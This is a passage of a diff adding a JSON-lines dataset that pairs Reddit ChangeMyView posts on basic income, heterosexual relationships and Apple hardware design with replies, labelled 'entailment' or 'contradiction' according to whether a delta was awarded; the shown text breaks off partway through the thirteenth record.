@@ -1,0 +1,1260 @@
+{
+  "nli_id": 1,
+  "pair_line": 1,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: We should strengthen the traditional safety net rather than replace it with basic income",
+    "body": "## Section I: Why is Basic Income Increasingly Popular? \n\n\"Basic income\" is a policy that has broad support from both the progressive left and libertarian right. Center-left economists including Paul Krugman have endorsed the scheme for various reasons. First, BI is an effective anti-poverty measure. BI also reduces inequality by redistributing income from capital to labor. Perhaps most importantly to some on the left, is the notion that BI provides people with \"freedom.\" Left-libertarian politi...",
+    "author": "gobears10",
+    "submission_id": "t3_30oi71"
+  },
+  "hypothesis": {
+    "body": "The majority of your points seem predicated on the idea that a) Basic Income requires a flat tax or rejects progressive taxation, and b) that absolutely every social program must be scrapped for a BI to take effect.\n\nNeither of these are true. Of course there are many conservatives or right-libertarian who would prefer those outcomes, but there are also many liberals and left-libertarians who do not.\n\nThe title of your CMV is worded incorrectly. You are arguing against not Basic Income, but the questions of how to pay for it and what exactly would be \"replaced.\"\n\nIf that doesn't change your view, I'm really not sure what would.  The post is very well written and laid out, it's just a perfectly shot arrow aimed at the wrong target.",
+    "author": "DaystarEld",
+    "comment_id": "cpumucv",
+    "parent_id": "t3_30oi71",
+    "score": 0,
+    "created_utc": "1427651011",
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.10426540284360189
+}
+{
+  "nli_id": 2,
+  "pair_line": 1,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: We should strengthen the traditional safety net rather than replace it with basic income",
+    "body": "## Section I: Why is Basic Income Increasingly Popular? \n\n\"Basic income\" is a policy that has broad support from both the progressive left and libertarian right. Center-left economists including Paul Krugman have endorsed the scheme for various reasons. First, BI is an effective anti-poverty measure. BI also reduces inequality by redistributing income from capital to labor. Perhaps most importantly to some on the left, is the notion that BI provides people with \"freedom.\" Left-libertarian politi...",
+    "author": "gobears10",
+    "submission_id": "t3_30oi71"
+  },
+  "hypothesis": {
+    "body": "Question: you seem to assume that we must have *either* a safety net *or* a basic income. But I think everyone party to this debate (whether they think the safety net is inherently good or bad) would accept that you can have *both* a basic income and a safety net at the same time, and that you do not need to put 100% of tax revenue into basic income to get much (or all) of the benefit. (This is where the leftist and left-libertarians usually part ways with the right-libertarians.)\n\nPast this, some of the arguments you make in favor of traditional public services don't acknowledge that these are not transfer payments at all, but public goods.  Traditionally programs like SNAP have been defended in terms of the greater needs of the least advantaged, but this has never been the justification for bridge-building, tank battalions, middle schools, or public health campaigns.  (To paraphrase France - the law, in its majesty, encourages both the rich and the poor to walk across bridges.)\n\nBetween these two points, I think all of the substantive differences between conditional payments and basic income that you raise in section IV disappear. Can you rephrase any of these section-IV points so that (a) you aren't defending public goods on grounds which have no connection to inequality (b) you aren't defending the *existence* of the social safety net (rather than defending the status quo that 0% of transfer payments go to basic income)?\n\nNext issue:\n\n&gt; Regarding the funding side, I oppose forgoing our progressive income tax system in favor of a flat tax. \n\nLet's say I had a tax system where someone who make 43,000 pays no taxes, someone who makes 60,000 pays 1/6 of their income in taxes, someone who makes 100,000 pays 40% of their income in taxes, someone who makes 200,000 pays 55%... that sounds relatively progressive, right?\n\nExcept all I described as a $30,000 basic income with a 70% flat tax.  The problem with your opposition is that a flat tax plus a basic income is the same as a progressive income tax. There's no difference, other than that poor people (as with the EITC) and people with no income (unlike the EITC) can actually go down to negative rates.  Or, if you really are opposed to the words \"basic income\" and \"flat tax\", you can just say that you want a highly progressive income tax that will go negative, with people with no income getting the largest \"negative tax\"; if that way of phrasing it appeals to you, then great. (If you are opposed specifically to *having high-earners work more*, and you think all else equal the high-earners should take a break and relax, then that is a good reason to avoid a flat tax. But as far as having high-earners pay a greater or lesser proportion of their total incomes as tax, you can always make a tax flatter *and* more progressive by raising the basic income associated with it, if a society does offer a basic income.)\n\nDo you accept these two points? Because you wrote so much, I want to deal with the points that I think are simplest and least controversial first.  (I should also add that I accept most of what you say in section III, and don't intend to challenge it; however, I also think that the automation-causes-mass-unemployment meme is crazy, so I don't see it as relevant to the argument over basic income, although there are certainly misguided people out there who do think this.)",
+    "author": "catastematic",
+    "comment_id": "cpucmvk",
+    "parent_id": "t3_30oi71",
+    "score": 7,
+    "created_utc": "1427619197",
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.10426540284360189
+}
+{
+  "nli_id": 3,
+  "pair_line": 2,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: We should strengthen the traditional safety net rather than replace it with basic income",
+    "body": "## Section I: Why is Basic Income Increasingly Popular? \n\n\"Basic income\" is a policy that has broad support from both the progressive left and libertarian right. Center-left economists including Paul Krugman have endorsed the scheme for various reasons. First, BI is an effective anti-poverty measure. BI also reduces inequality by redistributing income from capital to labor. Perhaps most importantly to some on the left, is the notion that BI provides people with \"freedom.\" Left-libertarian politi...",
+    "author": "gobears10",
+    "submission_id": "t3_30oi71"
+  },
+  "hypothesis": {
+    "body": "&gt; Section V: Does the Welfare Trap Truly Exist?\n&gt; Moreover, libertarian supporters of UBI/NIT bring up the \"welfare-trap\" that exists in means tested welfare programs. I did a pretty lengthy search and could find no actual numerical data to confirm that this effect is significant. There are too many conflicting motivations at play, too many demographics, too many differing situations to say for certain our current welfare system turns people into lazy bums who won't seek work. Most welfare recipients today, given the opportunity, would prefer a steady cash income and the opportunity to advance to a stagnant and unproductive life on welfare. They want to look for work.\n\nTry searching for 'welfare trap', 'welfare cliff', 'unemployment trap', 'welfare marginal withdrawal rates', 'participation tax rate' ... or, to save some time, search google images for 'welfare cliff' or suchlike. I am very surprised you have seen no evidence of them. I don't know what effect you'd think is \"significant\". There is left and right consensus they exist.\n\nNote: as they apply to individuals and households (some benefits, e.g. UK's housing benefit, are allocated to 'households' not individuals in the household), it's important to look at the effects on households too.\n\nI know next to nothing about the myriad systems in the USA. Cato has claimed there are 126 federal schemes and then of course there are systems in a particular state. But if any system withdraws a benefit as you earn additional units of currency there is a disincentive. Such disincentives are inherent in means tested tax-and-benefits systems as the benefits are withdrawn (at different rates) in combination with income taxes (including national insurance contributions and suchlike) as you earn. \n\n*marginal withdrawal rate*\n\nIf for example a dollar is withdrawn for each additional dollar earned from work, that is a 'marginal withdrawal rate' of 100% and he wouldn't be better off working those additional hours.\n\n*participation tax rate*  \n\nPTR measures the percentage of earnings lost in tax or withdrawn benefits when an individual moves into work. If a person faced a PTR of 100% then he wouldn't be financially better off working than not working as what he earned would be withdrawn from his benefits.\n\nOf course not all rates are 100%. But the higher the rate the higher the disincentive. And it is even possible to have rates greater than 100% - in other words it costs you more to work than sit at home. And that's without considering transport to and from work and any other costs of working.\n\n*varying hours of work*\n\nAnd there is another consideration: how the system copes with varying hours of work. In the UK we have a growing number of people on so-called 'zero hour contracts' - no guarantee of working hours. One week it could be zero, another week 20, another week 10, another week 30 hours or whatever. How does the system cope with that? Suppose the system underpays one week or month, leaving you short of money or overpays and claws back the difference. That makes it difficult to plan ahead.",
+    "author": "ElGuapoBlanco",
+    "comment_id": "cpufpbf",
+    "parent_id": "t3_30oi71",
+    "score": 4,
+    "created_utc": "1427634141",
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.14240506329113925
+}
+{
+  "nli_id": 4,
+  "pair_line": 2,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: We should strengthen the traditional safety net rather than replace it with basic income",
+    "body": "## Section I: Why is Basic Income Increasingly Popular? \n\n\"Basic income\" is a policy that has broad support from both the progressive left and libertarian right. Center-left economists including Paul Krugman have endorsed the scheme for various reasons. First, BI is an effective anti-poverty measure. BI also reduces inequality by redistributing income from capital to labor. Perhaps most importantly to some on the left, is the notion that BI provides people with \"freedom.\" Left-libertarian politi...",
+    "author": "gobears10",
+    "submission_id": "t3_30oi71"
+  },
+  "hypothesis": {
+    "body": "A variation of strengthening existing welfare is called guaranteed income (where you get cash up to $20k if your income is less than $20k).  It is a terrible idea compared to UBI, but let me address your points first\n\n&gt; \"welfare-trap\" that exists in means tested welfare programs. I did a pretty lengthy search and could find no actual numerical data to confirm\n\nThe welfare trap is completely indisputable.  You are paid/offered money only if you stay poor/unemployed.  Of course that increases the incentive to stay poor.  If you dispute that, you'd have to dispute all economic incentives for any work or sale as encouraging that work or sale.\n\n&gt; welfare state has shown to be successful in the social democratic nations of Sweden... Keynesian Automatic Stabilizers\n\nMoney distribution is what reduces poverty and keeps the economy strong.  Pretty obviously though, if you are paying people to do useless jobs (supervising who is allowed to receive free money) or paying them to stay poor (to do nothing), then you are reducing their potential to do something useful.\n\nUBI lets people do anything instead of incentivising them to do nothing.\n\n\n&gt; Even if workers are given an income floor, corporations can still artificially reduce pay\n\nUBI allows for a fair and free market for labour.  By eliminating the desperation motive to accept work, a fair price and conditions needs to be offered to workers.  There doesn't need to be an opinion about what is the one true fair wage for everyone else.  If everyone wants to work, then wages will go down.  If few people want to work, go up (negotiating leverage).  Whatever the outcome is, it is the exact correct value for wage prices that makes the most people happy.\n\n&gt; Progressive Income Taxes\n\nUBI combines with a flat tax is a more progressive tax system than what we currently have.  $15k UBI and a 30% flat tax would mean that someone earning $50k pays 0 net tax (much less than they currently do).  $100k income pays $15k net tax (again less).  $1M income, $285k net tax (likely more than current tax bill)\n\nBad conditional welfare programs include guaranteed income, obamacare subsidies, and education loans.\n\nThe first 2 share the welfare trap problem.  You will refuse part time or seasonal work because it pays you nothing under guaranteed income, or pushes you above a welfare cliff that will cost you more in out of pocket healthcare expenses.\n\nThe problem with targeted education assistance (loans specifically) is the excessive price gouging that takes place by even good schools, but also the rise of crappy expensive private schools that exploit the gullibility of young people in taking on massive debt.\n\nUBI also allows people to learn.  But there is no automatic subsidy that permits education at any cost.  Healthcare is probably better offered as a universal benefit, but UBI high enough can let people afford healthcare, and make providers ensure that they can offer appealing coverage options, instead of manipulating the same subsidy system that makes education expensive.\n",
+    "author": "Godspiral",
+    "comment_id": "cpuj5is",
+    "parent_id": "t3_30oi71",
+    "score": 2,
+    "created_utc": "1427643479",
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.14240506329113925
+}
+{
+  "nli_id": 5,
+  "pair_line": 3,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: We should strengthen the traditional safety net rather than replace it with basic income",
+    "body": "## Section I: Why is Basic Income Increasingly Popular? \n\n\"Basic income\" is a policy that has broad support from both the progressive left and libertarian right. Center-left economists including Paul Krugman have endorsed the scheme for various reasons. First, BI is an effective anti-poverty measure. BI also reduces inequality by redistributing income from capital to labor. Perhaps most importantly to some on the left, is the notion that BI provides people with \"freedom.\" Left-libertarian politi...",
+    "author": "gobears10",
+    "submission_id": "t3_30oi71"
+  },
+  "hypothesis": {
+    "body": "First, your disagreements about different funding ideas are not attacks on the basic income itself, unless you were attacking resource taxes used to fund resource dividends, a different but related idea to the basic income, but you did not address that. You want to keep the progressive income tax? Fine by me.\nSecond, there is no evidence that the government can run people's lives better than they can run their own. The government can cause people to make better decisions by educating them and providing resources. But when the government imposes regulations, demands paperwork, and takes enforcement action against people, the burden and stress discourages personal improvement. And experiments with direct cash transfers to the poor show they often come up with useful and responsible things to do with the money that the experts never thought of. Finally, the sanction of taking away money is counter productive. Becoming homeless almost never causes addicts to give up drugs, teenagers to study more, or the overweight to buy more nutritious foods.\nThird, your support of means testing contradicts your paternalistic desire for conditional transfers to protect poor people from their own irrational behavior, unless you believe the rich are less inclined to irrational behavior. Why only tell the poor what to do with their money? Part of the issue here is that many UBI supporters see a UBI not as charity, but as justice. The UBI is compensation for obeying a system of laws imposed by others that includes a set of property rights I never agreed to which denies me access to most of the Earth. The poor deserve the UBI. You do not tell BIll Gates what to do with his money, do not tell the poor what to do with theirs.\nFourth, if technology reduces the need for workers, why use the threat of starvation to FORCE people to do jobs they do not want to do and which society does not need anyone to do just because you want these people to experience the dignity of work? You pointed out elsewhere that welfare does make people lazy; people want to be productive. Lottery winners and rich heirs do not stop working. Instead they find work to do that fulfills them personally. If it becomes possible for automation to give literally everyone the same opportunity, why deny them that?\nFifth, a basic income IS a Keynesian stabilizer. A basic income funded primarily from an income tax would become a massive institutionalized entitlement expected by the population whose cost would automatically increase and decrease in direct opposition to the economy. As unemployment rises, the number of net receivers goes up, and as unemployment falls, so will the number of net receivers. Keynes once famously said that the government should pay people to dig holes and fill them back up again. But why waste people's time? Anyone who sits on the couch and watches TV while living off of a basic income will contribute as much to society as the hole diggers. And anyone who does anything more productive will create a net good for society.\nSixth, the welfare trap does not mean that recipients become lazy bums. It means that recipients remain poor and in a cycle of being working poor and receiving benefits regardless of how hard they work. Complying with the paperwork and conditions for receiving TANF is so burdensome I once had a client take a semester off from college so she catch up on her welfare-to-work paperwork and conditions. Once welfare recipients start working, if they report it, they lose benefits quickly and remain poor, and if they do not report it they are committing fraud and risk jail. A recipient who saves or invests a windfall can be kicked off of benefits for having assets even if they have no ongoing income, forcing them to spend down until they again have nothing left and forcing them to spend several months with no assets or income while they reapply for benefits. Advocates for the poor receive training in how to advise their clients to spend down windfalls without running afowl of many complicated rules essentially advising their poor clients in how to remain poor.\nSeventh, I agree we should not even begin to consider eliminating the minimum wage and labor laws until there is a basic income sufficient to realistically allow workers to walk away from employment they do not like, which would be well north of $12,000 per year, probably more in the $15,000 to $20,000 range.\nFinally, opposition to conditional and means-tested benefits does not imply opposition to all government spending other than a UBI. The UBI can be paid to citizens in-kind. Cash is presumptively best, but that presumption can be overcome by evidence showing that certain goods are best provided by the government. Single-payer health insurance has mt that burden, as have parks and libraries. Also, the government can invest in the wealth of society at large, such as with spending on universal education, infrastructure, and scientific research.",
+    "author": "TRC_esq",
+    "comment_id": "cpudthh",
+    "parent_id": "t3_30oi71",
+    "score": 8,
+    "created_utc": "1427625276",
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.16985645933014354
+}
+{
+  "nli_id": 6,
+  "pair_line": 3,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: We should strengthen the traditional safety net rather than replace it with basic income",
+    "body": "## Section I: Why is Basic Income Increasingly Popular? \n\n\"Basic income\" is a policy that has broad support from both the progressive left and libertarian right. Center-left economists including Paul Krugman have endorsed the scheme for various reasons. First, BI is an effective anti-poverty measure. BI also reduces inequality by redistributing income from capital to labor. Perhaps most importantly to some on the left, is the notion that BI provides people with \"freedom.\" Left-libertarian politi...",
+    "author": "gobears10",
+    "submission_id": "t3_30oi71"
+  },
+  "hypothesis": {
+    "body": "You have created a false dichotomy of only those two choices.   You've completely ignored the idea of improving the system such that everyone could survive without need for welfare/SNAP or a cash stipend.    We need a living wage.   We need to reform how Disability is handled so that those who can't work don't end up homeless.   We need to address zoning, rental property laws, and lending practices so that there's an affordable home for anyone.   We need to fix income insecurity by reforming labor laws so that employers aren't firing workers or reducing hours without cause or notice.    In a perfect work there should be job for anyone willing to work.     Childcare is a big issue that keeps some women on government assistance,  and we address that with affordable childcare, free birth control and sterilization,  and better education.      I believe if we give everyone the opportunity to work, pay them a living wage, and remove roadblocks to stable employment dependence on government assistance would die out.\n\nSome money would have to be used for substance abuse and mental health.    Anyone who wants to get off drugs should get access to rehab.    While expensive up front,  long term their return to functional society would be a return on investment.    And I believe crime and child abuse will drop when a significant number of addicts and mentally ill are treated.   I believe simply handing them cash and denying them treatment is detrimental to their situation. \n\nAs it stands now,  there clearly is a government assistance trap.  One can live a much better quality of life by working part time or choosing not to work than choosing to work full time.   One big difference is the loss of free health care:  medicaid kicks in when someone has minimal income.  In the us we know the average plan costs $6,100 a year for an individual or $16,800 for family of four.   If minimum wage remains under $10/hr, an entire parent's income would go to buy health insurance if he's working full time.  Employers of lower tier jobs weaseled out of their ACA requirements by making full time workers part time.   Some of them require employees to pay a contribution that may be a third of that months pay.    And once you add in all the other things government assistance cuts off as soon as you approach their arbitrary poverty line (food, childcare, heating assistance), a family is poorer if dad works full time at slightly above minimum wage than if he worked part time.     They also punish recipients who try to have savings.\n\nConservatives resist government assistance because they claim if a person wants to earn more all you need is more education and a little ambition.   That completely ignores that of the available jobs, many pay less than a living wage.  There's no point in going to college if there isn't job creation in those industries.    I believe this is yet another argument for a big increase in minimum wage.   It's crazy to allow corporations to underpay their staff knowing the taxpayers will be making up the difference so poor people can have food, shelter,  and medicine. ",
+    "author": "funchy",
+    "comment_id": "cpuin82",
+    "parent_id": "t3_30oi71",
+    "score": 2,
+    "created_utc": "1427642345",
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.16985645933014354
+}
+{
+  "nli_id": 7,
+  "pair_line": 4,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: We should strengthen the traditional safety net rather than replace it with basic income",
+    "body": "## Section I: Why is Basic Income Increasingly Popular? \n\n\"Basic income\" is a policy that has broad support from both the progressive left and libertarian right. Center-left economists including Paul Krugman have endorsed the scheme for various reasons. First, BI is an effective anti-poverty measure. BI also reduces inequality by redistributing income from capital to labor. Perhaps most importantly to some on the left, is the notion that BI provides people with \"freedom.\" Left-libertarian politi...",
+    "author": "gobears10",
+    "submission_id": "t3_30oi71"
+  },
+  "hypothesis": {
+    "body": "your position rests on the assumption that most people, given ideal education and social environments, have the ability to do just about any job as well as anyone else. this assumption runs counter to the available data regarding the heritability of psychological traits and limits of environmental intervention.\n\nthe reason this is significant is that there is a solid chance a great number of people will not have the interest or ability to transfer into these new areas of the economy no matter what programs are in place to assist them. even in the wildest post scarcity economic dream, the idea that each person has the ability, creativity, and will to provide valued service seems pretty far fetched.\n\nso what do we do to feed these people? ever more programs for this and that, further bloating our bureaucracy and keeping money from the people that need it to live?",
+    "author": "C-LAR",
+    "comment_id": "cpudcxf",
+    "parent_id": "t3_30oi71",
+    "score": 39,
+    "created_utc": "1427622850",
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.08085106382978724
+}
+{
+  "nli_id": 8,
+  "pair_line": 4,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: We should strengthen the traditional safety net rather than replace it with basic income",
+    "body": "## Section I: Why is Basic Income Increasingly Popular? \n\n\"Basic income\" is a policy that has broad support from both the progressive left and libertarian right. Center-left economists including Paul Krugman have endorsed the scheme for various reasons. First, BI is an effective anti-poverty measure. BI also reduces inequality by redistributing income from capital to labor. Perhaps most importantly to some on the left, is the notion that BI provides people with \"freedom.\" Left-libertarian politi...",
+    "author": "gobears10",
+    "submission_id": "t3_30oi71"
+  },
+  "hypothesis": {
+    "body": "A variation of strengthening existing welfare is called guaranteed income (where you get cash up to $20k if your income is less than $20k).  It is a terrible idea compared to UBI, but let me address your points first\n\n&gt; \"welfare-trap\" that exists in means tested welfare programs. I did a pretty lengthy search and could find no actual numerical data to confirm\n\nThe welfare trap is completely indisputable.  You are paid/offered money only if you stay poor/unemployed.  Of course that increases the incentive to stay poor.  If you dispute that, you'd have to dispute all economic incentives for any work or sale as encouraging that work or sale.\n\n&gt; welfare state has shown to be successful in the social democratic nations of Sweden... Keynesian Automatic Stabilizers\n\nMoney distribution is what reduces poverty and keeps the economy strong.  Pretty obviously though, if you are paying people to do useless jobs (supervising who is allowed to receive free money) or paying them to stay poor (to do nothing), then you are reducing their potential to do something useful.\n\nUBI lets people do anything instead of incentivising them to do nothing.\n\n\n&gt; Even if workers are given an income floor, corporations can still artificially reduce pay\n\nUBI allows for a fair and free market for labour.  By eliminating the desperation motive to accept work, a fair price and conditions needs to be offered to workers.  There doesn't need to be an opinion about what is the one true fair wage for everyone else.  If everyone wants to work, then wages will go down.  If few people want to work, go up (negotiating leverage).  Whatever the outcome is, it is the exact correct value for wage prices that makes the most people happy.\n\n&gt; Progressive Income Taxes\n\nUBI combines with a flat tax is a more progressive tax system than what we currently have.  $15k UBI and a 30% flat tax would mean that someone earning $50k pays 0 net tax (much less than they currently do).  $100k income pays $15k net tax (again less).  $1M income, $285k net tax (likely more than current tax bill)\n\nBad conditional welfare programs include guaranteed income, obamacare subsidies, and education loans.\n\nThe first 2 share the welfare trap problem.  You will refuse part time or seasonal work because it pays you nothing under guaranteed income, or pushes you above a welfare cliff that will cost you more in out of pocket healthcare expenses.\n\nThe problem with targeted education assistance (loans specifically) is the excessive price gouging that takes place by even good schools, but also the rise of crappy expensive private schools that exploit the gullibility of young people in taking on massive debt.\n\nUBI also allows people to learn.  But there is no automatic subsidy that permits education at any cost.  Healthcare is probably better offered as a universal benefit, but UBI high enough can let people afford healthcare, and make providers ensure that they can offer appealing coverage options, instead of manipulating the same subsidy system that makes education expensive.\n",
+    "author": "Godspiral",
+    "comment_id": "cpuj5is",
+    "parent_id": "t3_30oi71",
+    "score": 2,
+    "created_utc": "1427643479",
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.08085106382978724
+}
+{
+  "nli_id": 9,
+  "pair_line": 5,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: Males and Females are socially and emotionally incompatible and heterosexual relationships are unrealistic and farcical.",
+    "body": "Hi CMV! \n\nI am of the belief that there cannot exist a legitimate emotional bond between a male and a female that lead to a loving relationship (that is - one of romance). Not once have I seen a couple that did not have an enormous gap in interests, composure, speech patterns, and emotional engagement. There's always and awkward disparity between each partner, and they seem to be tolerating each other, whilst there is little to grasp on why they are interested in each other aside from basic biol...",
+    "author": "TaslaVenhyle",
+    "submission_id": "t3_4gdj35"
+  },
+  "hypothesis": {
+    "body": "You seem to be basing your entire argument on an anecdotal observation, which would seem to be heavily colored by confirmation bias. I'm fairly certain nobody else in here shares your observations, and there's a good reason for that.\n\nIf you think that differences in interests or composure are relationship killers, then I think you have a very handcrafted definition of what a good, healthy relationship is. Not to mention I have no clue what you mean by \"speech patterns\" or \"emotional engagement\".\n\nMen and women are different; sure, that's a given. They're different for a reason: a male/female pair is designed to be complementary in many regards. What one lacks, the other specializes in, and this means the pair can lean on each other's strengths. A pair of male/male or female/female is inherently weaker because it cannot tap into the advantage of the missing sex.\n\nThis is the crux of the issue: you seem to think that a relationship can only consist of two individuals who are perfectly alike in every way. This makes for an easy relationship, but not a good or fulfilling one. You cannot learn from or grow with a person who is just like you.\n\nMale/female relationships are designed to be complementary, and the resulting bond (when done right; loads of people do it wrong) strengthens them both immeasurably. Take it from a person whose parents have been married for 30+ years, and whose grandparents have all been married for 50+.",
+    "author": "AmoebaMan",
+    "comment_id": "d2goctk",
+    "parent_id": "t3_4gdj35",
+    "score": 2,
+    "created_utc": 1461600611,
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.12698412698412698
+}
+{
+  "nli_id": 10,
+  "pair_line": 5,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: Males and Females are socially and emotionally incompatible and heterosexual relationships are unrealistic and farcical.",
+    "body": "Hi CMV! \n\nI am of the belief that there cannot exist a legitimate emotional bond between a male and a female that lead to a loving relationship (that is - one of romance). Not once have I seen a couple that did not have an enormous gap in interests, composure, speech patterns, and emotional engagement. There's always and awkward disparity between each partner, and they seem to be tolerating each other, whilst there is little to grasp on why they are interested in each other aside from basic biol...",
+    "author": "TaslaVenhyle",
+    "submission_id": "t3_4gdj35"
+  },
+  "hypothesis": {
+    "body": "&gt; I am of the belief that there cannot exist a legitimate emotional bond between a male and a female that lead to a loving relationship (that is - one of romance). Not once have I seen a couple that did not have an enormous gap in interests, composure, speech patterns, and emotional engagement.\n\nSo for starters, the fact that you personally haven't seen this does not mean it's never happened. As well, you can have a legitimate bond without having every single one of those things be exactly alike. And finally, why do you think this is solely seen in heterosexual relationships, since all of these are equally capable, and do often exist in homosexual relationships.\n\n&gt; and heterosexual relationships continue only because of a heteronormitive society\n\nThey continue because most people in the world are heterosexual. You can't choose your sexuality.",
+    "author": "FlyingFoxOfTheYard_",
+    "comment_id": "d2gjw3i",
+    "parent_id": "t3_4gdj35",
+    "score": 3,
+    "created_utc": 1461594703,
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.12698412698412698
+}
+{
+  "nli_id": 11,
+  "pair_line": 6,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: Males and Females are socially and emotionally incompatible and heterosexual relationships are unrealistic and farcical.",
+    "body": "Hi CMV! \n\nI am of the belief that there cannot exist a legitimate emotional bond between a male and a female that lead to a loving relationship (that is - one of romance). Not once have I seen a couple that did not have an enormous gap in interests, composure, speech patterns, and emotional engagement. There's always and awkward disparity between each partner, and they seem to be tolerating each other, whilst there is little to grasp on why they are interested in each other aside from basic biol...",
+    "author": "TaslaVenhyle",
+    "submission_id": "t3_4gdj35"
+  },
+  "hypothesis": {
+    "body": "&gt; Not once have I seen a couple that did not have an enormous gap in interests\n\nFor what it's worth, there are two large biases here with you need to contend with.\n\n1. The couples which you know and see will be influenced heavily with who you associate with and is not representative of relationships in general or the potential which some relationships can reach\n\n2. This also depends heavily upon your judgment of those relationships. Which has the following problems \n\n  * You might not have complete indepth knowledge between the dynamics of these couples\n\n  * Even if you did, you might midjudge aspects of a relationship. Do you know exactly what the other person needs or is looking for? Do you know what elements create successful relationships? Can you judge those correctly 100% of the time?\n\nAlso,\n\n&gt; and heterosexual relationships continue only because of a heteronormitive society and the biology of reproduction \n\nWhat about relationships which last past this stage? This statement obviously doesn't hold up either.\n\n&gt; I may be biased, but from my perspective and experience I've simply never seen a straight couple that was legitimately compatible in most ways.\n\nThat's basically your argument \"i've never seen it work before therefore it cant work\". It's not a very good position to defend because, as you've already awknowledged, its covered in bias which prevents it from being logically valid.\n\n\n\n___\n\nI'm personally in a working relationship and the differences between thinking which come from being different sexes is quite apparent, that doesn't mean we cant work with it though.\n\n&gt;they seem to be tolerating each other\n\nYes, there's a lot of that in a relationship. After all of the love hormones wear off after a couple of years there is an element of toleration since your partners flaws begin to show and you become to get to know them. The point is though that we're also able to accept each others flaws and let on with our lives despite them.\n\nThe reason why we can ignore them is because more of the time we are supportive of each other. We communicate openly and honestly and we are good listeners. We enjoy each others company much more often than not. We also accept that if the other falls short for some reason that they are only human and that's to be expected.",
+    "author": "BenzineBro",
+    "comment_id": "d2gl23i",
+    "parent_id": "t3_4gdj35",
+    "score": 3,
+    "created_utc": 1461596331,
+    "delta_awarded": true
+  },
+  "comments_similarity": 0.11242603550295859
+}
+{
+  "nli_id": 12,
+  "pair_line": 6,
+  "label": "contradiction",
+  "premise": {
+    "title": "CMV: Males and Females are socially and emotionally incompatible and heterosexual relationships are unrealistic and farcical.",
+    "body": "Hi CMV! \n\nI am of the belief that there cannot exist a legitimate emotional bond between a male and a female that lead to a loving relationship (that is - one of romance). Not once have I seen a couple that did not have an enormous gap in interests, composure, speech patterns, and emotional engagement. There's always and awkward disparity between each partner, and they seem to be tolerating each other, whilst there is little to grasp on why they are interested in each other aside from basic biol...",
+    "author": "TaslaVenhyle",
+    "submission_id": "t3_4gdj35"
+  },
+  "hypothesis": {
+    "body": "&gt; I am of the belief that there cannot exist a legitimate emotional bond between a male and a female that lead to a loving relationship (that is - one of romance). Not once have I seen a couple that did not have an enormous gap in interests, composure, speech patterns, and emotional engagement.\n\nSo for starters, the fact that you personally haven't seen this does not mean it's never happened. As well, you can have a legitimate bond without having every single one of those things be exactly alike. And finally, why do you think this is solely seen in heterosexual relationships, since all of these are equally capable, and do often exist in homosexual relationships.\n\n&gt; and heterosexual relationships continue only because of a heteronormitive society\n\nThey continue because most people in the world are heterosexual. You can't choose your sexuality.",
+    "author": "FlyingFoxOfTheYard_",
+    "comment_id": "d2gjw3i",
+    "parent_id": "t3_4gdj35",
+    "score": 3,
+    "created_utc": 1461594703,
+    "delta_awarded": false
+  },
+  "comments_similarity": 0.11242603550295859
+}
+{
+  "nli_id": 13,
+  "pair_line": 7,
+  "label": "entailment",
+  "premise": {
+    "title": "CMV: Apple are falsely equating simplicity with minimalism in their hardware design",
+    "body": "**Update**\n\nThanks for all the replies, there's been some really useful points and I'll dish out the deltas appropriately. The most convincing argument I've heard is that Apple is trying to build a computer for the near future and if it doesn't work for you then you don't have to buy it. USB-C is the future so why bother putting anything else in? USB lets you charge from a battery charger which is an extra convenience, even if it comes at the loss of MagSafe so why have a dedicated power socket?...",
+    "author": "mxlp",
+    "submission_id": "t3_5aceoz"
+  },
+  "hypothesis": {
+    "body": "Apple has always (or since Steve Jobs anyway) looked to evolve computers away from what they are now and towards a final form.\n\nThe iPhone isn't the way it is now because it is perfect, it is the way it is now because that is one step closer to the ideal. The ideal is the whole thing is a single piece of shatter proof glass and the whole back of the thing is a sensor so it can take perfect pictures in the dark, and it can't get scratched or ever look anything other than perfect. It charges wirelessly and can only be connected to bluetooth headphones which also charge wirelessly in 30 seconds and can hold a charge for 24 hours. The 7 is an iteration closer to that than any other phone out there.\n\nAlso, I hear a lot of bitching on reddit about how dumb it is not to have an 7mm jack without much consideration about what removing that jack gets you. Building a phone is really hard. There is ALWAYS a limit on space, materials, heat, battery demands, etc. Making a good phone is really hard. The latest gen. iPhone has very regularly been the best phone on the market for the last 10 years.\n\n\nWith their laptops the future of laptops is iPads, which they again revolutionized. Eventually laptops will be two touch screens, and you can use whichever is more comfortable, but because people are old and they like buttons you can press down on instead of typing on glass like the kids these days are used to that will remain a couple years away (also there are manufacturing cost concerns here.) The little scroll bar on the top isn't the final iteration of the design, it is a step on a multi-decade path. It will change the way that people interact with their laptops and eventually the whole keyboard will be glass and Johnny Ive will finally be able to sleep at night.\n\nI think a lot of your misgivings about Apple can to at least some extent be explained by how hard it is to balance a supply chain as large as the one apple must manage, and you have to be able to see this as a transformative step not a final one.\n\nFor example, with their ports, they could either ship out phone chargers that only connected to Apple made lightning -&gt; outlet adapters, or they could ship out phone chargers that work with the usb-&gt; outlet adapters that everyone already has, but then don't work with their laptop.\n\nThat was a difficult decision to make, between synergy within the company and ease for the consumer, and they didn't choose the minimalist approach, they chose the one that wouldn't piss off a bunch of people for having to replace all their phone cords.\n\nThis means that they is space in the market for people who want an iPhone 7 but not a Macbook. And the end result is still the same for Macbook users: if you buy a Macbook you will need all new cords to fit with it.\n\nNotably this isn't an unprecedented move for Apple. Are you old enough to remember firewire?",
